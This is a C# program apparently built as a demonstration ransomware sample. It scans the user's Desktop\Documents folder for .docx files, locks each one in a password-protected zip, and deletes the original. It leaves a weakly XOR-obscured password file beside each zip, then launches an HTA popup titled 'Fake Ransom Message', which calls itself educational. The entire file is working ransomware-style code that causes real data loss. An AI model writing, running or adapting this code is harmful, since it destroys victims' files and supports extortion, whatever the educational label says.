using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using Ionic.Zip;

namespace SystemZ
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string sourceDirectory = Path.Combine(userProfile, @"Desktop\Documents");

                // Check if the Documents folder exists
                if (!Directory.Exists(sourceDirectory))
                {
                    Console.WriteLine("Documents folder does not exist on Desktop or no .docx files inside.");
                    return; // Exit the application
                }

                // Check if there are any .docx files in the Documents folder
                string[] docxFiles = Directory.GetFiles(sourceDirectory, "*.docx", SearchOption.AllDirectories);
                if (docxFiles.Length == 0)
                {
                    Console.WriteLine("Documents folder does not exist on Desktop or no .docx files inside.");
                    return; // Exit the application
                }

                // Define the path for the HTA file
                string htaPath = Path.Combine(sourceDirectory, "info.hta");

                string htaContent = @"
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Info</title>
                    <hta:application 
                        id='myApp'
                        border='thin'
                        borderstyle='normal'
                        sysmenu='yes'
                        caption='yes'
                        contextmenu='no'
                        scroll='no'
                        showintaskbar='yes'
                        windowstate='normal'
                    />
                    <style>
                        body {
                            font-family: Arial, sans-serif;
                            margin: 20px;
                        }
                        #container {
                            text-align: center;
                            padding: 20px;
                            border: 1px solid #ccc;
                            background-color: #f9f9f9;
                        }
                        #closeBtn {
                            margin-top: 20px;
                        }
                    </style>
                </head>
                <body>
                    <div id='container'>
                        <h1>Fake Ransom Message</h1>
                        <p>This is a Fake popup asking for money.</p>
                        <p>For educational purposes only</p>
                        <button id='closeBtn' onclick='window.close()'>Close</button>
                    </div>
                </body>
                </html>";

                // Write the content to the HTA file
                File.WriteAllText(htaPath, htaContent);

                // Generate the XOR key based on the current time
                byte xorKey = GenerateTimeBasedKey();

                // Process each .docx file
                foreach (string file in docxFiles)
                {
                    try
                    {
                        string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(file);
                        string zipFilePath = Path.Combine(Path.GetDirectoryName(file), $"{fileNameWithoutExtension}.zip");
                        string originalPassword = GenerateRandom128BitPassword();
                        string modifiedPassword = ModifyPassword(originalPassword, xorKey);

                        using (ZipFile zip = new ZipFile())
                        {
                            zip.Password = originalPassword;
                            zip.AddFile(file, "");
                            zip.Save(zipFilePath);
                        }

                        File.Delete(file);

                        string txtFilePath = Path.Combine(Path.GetDirectoryName(file), $"{fileNameWithoutExtension}.txt");
                        string content = $"Date zipped: {DateTime.Now}\nPassword: {modifiedPassword}\nTimestamp: {GenerateTimestamp()}";
                        File.WriteAllText(txtFilePath, content);

                        Console.WriteLine($"Zipped {fileNameWithoutExtension}.docx to {fileNameWithoutExtension}.zip and created {fileNameWithoutExtension}.txt");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"An error occurred while processing {file}: {ex.Message}");
                    }
                }

                // Optionally, launch the HTA file after all zip operations are over
                Process.Start("mshta.exe", htaPath);
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }

        // Method to generate a random 128-bit password
        private static string GenerateRandom128BitPassword()
        {
            using (var rng = new RNGCryptoServiceProvider())
            {
                byte[] randomBytes = new byte[16]; // 128 bits = 16 bytes
                rng.GetBytes(randomBytes);
                return BitConverter.ToString(randomBytes).Replace("-", "");
            }
        }

        // Method to generate a time-based XOR key
        private static byte GenerateTimeBasedKey()
        {
            long timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
            using (var sha256 = SHA256.Create())
            {
                byte[] hash = sha256.ComputeHash(BitConverter.GetBytes(timestamp));
                return hash[0];
            }
        }

        // Method to modify the password using XOR with a key
        private static string ModifyPassword(string password, byte key)
        {
            char[] modifiedPassword = password.ToCharArray();

            for (int i = 0; i < 8; i++)
            {
                modifiedPassword[i] = (char)(modifiedPassword[i] ^ key);
            }

            return new string(modifiedPassword);
        }

        // Method to generate a timestamp
        private static string GenerateTimestamp()
        {
            return DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString();
        }
    }
}
